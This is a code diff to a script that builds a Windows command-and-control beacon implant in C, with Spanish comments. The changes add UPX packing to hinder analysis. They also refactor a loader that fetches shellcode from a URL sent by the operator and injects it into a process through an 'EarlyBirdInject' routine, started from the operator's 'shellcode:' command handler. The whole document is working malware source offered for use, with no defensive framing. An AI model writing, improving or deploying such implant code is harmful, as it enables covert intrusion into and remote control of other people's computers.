@@ -172,11 +172,13 @@ echo "OUTPUT: $OUTPUT"
 
 # === GENERAR Makefile ===
 cat > Makefile << EOF
-.PHONY: windows clean
+.PHONY: windows clean upx
 windows: beacon.c
 	x86_64-w64-mingw32-gcc beacon.c aes.c cJSON.c -o $OUTPUT -lwinhttp -lcrypt32 -lws2_32 -liphlpapi -lbcrypt -lshlwapi -lrpcrt4 -DUNICODE -D_UNICODE 
 clean:
 	#rm -f $OUTPUT beacon.c
+upx:
+	upx --best --ultra-brute $OUTPUT
 EOF
 
 cat > beacon.c << EOF
@@ -1560,53 +1562,59 @@ void hex_to_bytes(const char* hex, BYTE* output, size_t len) {
     }
 }
 
+// === executeLoader ===
 void executeLoader(void *arg){
-    const char *url = (const char *)arg; 
-    printf("[*] executeLoader: downloading shellcode from %s\n", url);
+    // === 1. Validar y loguear inmediatamente ===
+    if (!arg) {
+        printf("[-] executeLoader: arg is NULL\n");
+        fflush(stdout);
+        return;
+    }
+
+    char* url = (char*)arg;
+    printf("[*] executeLoader started for: %s\n", url);
     fflush(stdout);
 
+    // === 2. Descargar ===
     DWORD fileSize = 0;
     unsigned char* raw_content = DownloadToBuffer(url, &fileSize);
     if (!raw_content || fileSize == 0) {
-        printf("[-] Failed to download content\n");
+        printf("[-] executeLoader: Failed to download from %s\n", url);
+        fflush(stdout);
+        free(arg);
         return;
     }
 
-    // Asegurarnos de que es null-terminated
-    char* content = (char*)malloc(fileSize + 1);
-    if (!content) {
-        free(raw_content);
-        return;
-    }
-    memcpy(content, raw_content, fileSize);
-    content[fileSize] = '\0';
+    printf("[+] executeLoader: Downloaded %lu bytes\n", fileSize);
+    fflush(stdout);
+
+    // === 3. Extraer shellcode ===
+    unsigned char* shellcode = NULL;
+    int shellcode_len = extract_shellcode((char*)raw_content, fileSize, &shellcode);
     free(raw_content);
 
-    unsigned char* shellcode = NULL;
-    DWORD shellcodeSize = extract_shellcode(content, strlen(content), &shellcode);
-    if (shellcodeSize <= 0) {
-        printf("[-] Failed to extract shellcode\n");
-        free(content);
-        return;
-    }
-    free(content);
-
-    if (!shellcode || shellcodeSize == 0) {
-        printf("[-] Failed to parse shellcode from C format\n");
+    if (!shellcode || shellcode_len <= 0) {
+        printf("[-] executeLoader: Failed to extract shellcode\n");
+        fflush(stdout);
+        free(arg);
         return;
     }
 
-    printf("[+] Shellcode parsed successfully: %lu bytes\n", shellcodeSize);
+    printf("[+] executeLoader: Shellcode extracted: %d bytes\n", shellcode_len);
+    fflush(stdout);
 
-    if (!EarlyBirdInject(shellcode, shellcodeSize)) {
-        printf("[-] EarlyBirdInject failed\n");
+    // === 4. Inyectar ===
+    if (!EarlyBirdInject(shellcode, shellcode_len)) {
+        printf("[-] executeLoader: EarlyBirdInject failed\n");
     } else {
-        printf("[+] Shellcode executed via RtlCreateUserThread\n");
+        printf("[+] executeLoader: Shellcode injected successfully\n");
     }
+    fflush(stdout);
 
+    // === 5. Limpiar ===
     free(shellcode);
+    free(arg);
 }
-
 
 // ========================
 // FUNCIÓN DE INYECCIÓN DE SHELL 
@@ -4965,12 +4973,21 @@ void handleAdversary(char* command) {
     }
 
     if (strncmp(command, "shellcode:", 10) == 0) {
-        char* url = command + 10;
-        uintptr_t th = _beginthread(executeLoader, 0, _strdup(url));
-        if (th == (uintptr_t)-1) {
-            printf("[-] Failed to spawn loader thread\n");
+        char* url = _strdup(command + 10);
+        if (!url) {
+            printf("[-] executeLoader: _strdup failed\n");
+            return;
         }
-        snprintf(output, sizeof(output), "Shellcode loading: %s", url);
+
+        HANDLE hThread = (HANDLE)_beginthreadex(NULL, 0, (unsigned int (__stdcall *)(void *))executeLoader, url, 0, NULL);
+        if (hThread == NULL) {
+            printf("[-] executeLoader: Failed to create thread\n");
+            free(url);
+        } else {
+            printf("[+] executeLoader: Thread created, handle %p\n", hThread);
+            CloseHandle(hThread);  // 🔥 Desacopla
+        }
+        snprintf(output, sizeof(output), "Shellcode loading: %s", command + 10);
         goto send_response;
     }
 
@@ -5350,6 +5367,6 @@ EOF
 
 echo "[+] Generated beacon.c"
 make windows
-
 make clean
+make upx
 echo "[+] Compiled: $OUTPUT"
